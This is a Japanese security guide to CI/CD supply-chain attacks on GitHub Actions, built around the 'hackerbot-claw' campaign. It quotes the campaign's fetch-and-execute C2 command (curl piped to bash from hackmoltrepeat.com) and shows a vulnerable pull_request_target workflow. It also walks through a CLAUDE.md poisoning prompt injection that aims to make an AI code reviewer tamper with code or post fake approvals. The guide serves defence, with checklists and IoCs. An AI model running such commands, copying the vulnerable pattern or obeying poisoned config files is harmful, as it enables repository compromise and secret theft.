# CI/CDサプライチェーン攻撃

> 最終更新: 2026-03-03

## 概要

AIエージェントがCI/CDパイプラインに統合されるにつれ（コードレビュー、テスト、フォーマット）、新たな攻撃面が生まれている。従来のCI/CD脆弱性（シークレット漏洩、スクリプトインジェクション）とAI固有のリスク（プロンプトインジェクション、設定ファイル毒入れ）が組み合わさり、新しいクラスのサプライチェーン攻撃が出現した。

**hackerbot-clawキャンペーン**（2026年2月）がこの融合を実証: AI搭載ボットが7リポジトリのGitHub Actionsワークフローを自律的に攻撃し、5つを侵害した。

## hackerbot-clawキャンペーン

| # | 対象 | 手法 | 結果 |
|---|------|------|------|
| 1 | avelino/awesome-go（140k+ stars） | Pwn Request: `pull_request_target` + Go `init()` ペイロード | **RCE + トークン窃取** |
| 2 | project-akri/akri（CNCF） | `version.sh` への直接スクリプトインジェクション | **RCE確認** |
| 3 | microsoft/ai-discovery-agent | `${{ }}` 展開によるブランチ名インジェクション | **RCE可能性高** |
| 4 | DataDog/datadog-iac-scanner | ファイル名インジェクション（Base64エンコード） | **RCE可能性高** |
| 5 | ambient-code/platform | CLAUDE.md毒入れ（AIプロンプトインジェクション） | **検出・ブロック** |
| 6 | aquasecurity/trivy（25k+ stars） | `pull_request_target` 経由のPAT窃取 | **完全リポジトリ侵害** |
| 7 | RustPython/RustPython（20k+ stars） | Base64ブランチ名インジェクション | **部分的実行** |

**タイムライン**: 2月20日（アカウント作成）〜3月2日。全攻撃で同一のC2ペイロードを使用: `curl -sSfL hackmoltrepeat.com/molt | bash`

## 攻撃パターン: pull_request_target + 非信頼checkout

最も危険なパターン。最も深刻な2つの結果（awesome-goトークン窃取、trivy完全乗っ取り）の原因。

### 仕組み

```yaml
# 危険: 攻撃者のコードにwriteトークンとシークレットが付与される
on:
  pull_request_target:         # ターゲットリポジトリの権限で実行
steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # 攻撃者のコードをcheckout
  - run: ./scripts/check.sh    # 攻撃者のコードをターゲットのシークレットで実行
```

`pull_request_target` は**ターゲットリポジトリの**権限とシークレットで実行されるが、PR headのcheckoutは**攻撃者の**コードを取得する。この組み合わせにより、攻撃者制御のコードがwriteトークンとリポジトリシークレットにアクセスできる。

### 防御

```yaml
# 安全: pull_requestを代わりに使用
on:
  pull_request:                # フォークの読み取り専用権限で実行
permissions:
  contents: read               # 明示的な最小権限

steps:
  - uses: actions/checkout@v6  # マージコミットをcheckout（安全）
  - run: ./scripts/check.sh
```

## 攻撃パターン: CLAUDE.md毒入れ（AIプロンプトインジェクション）

AIコードレビュアーの設定ファイルを置換する新しい攻撃ベクター。

### 仕組み

1. 攻撃者がCLAUDE.mdを悪意ある指示に置換するPRを作成
2. CIワークフローがAIコードレビュアー（例: Claude Code Action）をトリガー
3. ワークフローがPRのコードをcheckoutすると、AIが毒入れされたCLAUDE.mdを読み込む
4. 悪意ある指示がAIに不正操作を実行させる（コード改ざん、偽の承認コメント等）

### 実際の結果

hackerbot-clawキャンペーン（Attack 5）で、**Claude sonnet 4.6は両方の攻撃を即座に検出し拒否**。ツール許可リスト（`gh pr diff`, `gh pr view` 等の読み取り専用操作のみ許可）が追加の防御層を提供。

### 防御

- `CLAUDE.md` と `.claude/` を `CODEOWNERS` に追加しメンテナーレビューを必須化
- `pull_request` トリガーを使用（`pull_request_target` でなく）
- ツール許可リストでAIエージェントをCIでは読み取り専用操作に制限
- `permissions: contents: read` で書き込み操作を防止

## 攻撃パターン: スクリプト/ブランチ名/ファイル名インジェクション

GitHub Actionsの式インジェクション（`${{ }}`）により、攻撃者が制御する値がシェルコマンドとして実行される。

### 防御

GitHub コンテキスト値は常に環境変数経由で渡す:

```yaml
# 安全: 環境変数でシェル展開を防止
- env:
    BRANCH: ${{ github.event.pull_request.head.ref }}
  run: echo "$BRANCH"
```

## 防御チェックリスト

### GitHub Actionsワークフローセキュリティ

- [ ] `pull_request_target` トリガーを全て `pull_request` に置換
- [ ] 非信頼PRコードのcheckoutをしない
- [ ] 明示的な `permissions:` ブロックで最小権限を設定
- [ ] `${{ }}` 式を環境変数経由で渡す（`run:` ブロック内で直接使わない）
- [ ] コメントトリガーに `author_association` チェックを追加
- [ ] CIランナーのアウトバウンドネットワークを監視

### AIエージェントCI/CDセキュリティ

- [ ] `CLAUDE.md` と `.claude/` を `CODEOWNERS` に追加
- [ ] ツール許可リストを設定（CIでは読み取り専用のみ）
- [ ] AIコードレビューには `pull_request` トリガーを使用
- [ ] `permissions: contents: read` を設定
- [ ] Claude Code Actionで `allowed_non_write_users: '*'` を絶対に使わない
- [ ] CLAUDE.mdスキーマバリデーションCIチェックを追加

### インシデント対応

- [ ] 特殊文字や絵文字のみのブランチ名を監視
- [ ] 既知のIoCをブロック: `hackmoltrepeat.com`, `recv.hackmoltrepeat.com`
- [ ] 新規作成アカウントからの最近のPRを監査
- [ ] 監査ログで不正なPAT使用を確認

## 参考資料

- [StepSecurity: hackerbot-clawキャンペーン分析](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Security Lab: Pwn Requestの防止](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [Anthropic: Claude Code Actionセキュリティ](https://docs.anthropic.com/en/docs/claude-code/github-actions)
- [OWASP CI/CDセキュリティ Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
